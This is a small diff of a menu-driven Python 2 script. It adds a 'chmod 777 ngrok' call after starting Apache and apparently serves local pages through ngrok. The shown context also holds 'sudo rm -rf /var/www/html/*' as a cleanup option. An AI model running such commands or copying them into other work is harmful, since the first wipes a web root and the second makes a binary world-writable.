@@ -64,6 +64,7 @@ st = raw_input ('\x1b[1;32;42m' +'Enter your decision .... : ''\x1b[0m')
 if st =="1":
    os.system("clear")
    os.system("sudo service apache2 start")
+   os.system("chmod 777 ngrok")
 elif st =="0":#clean
     os.system("sudo rm -rf /var/www/html/*")
     os.system("clear")
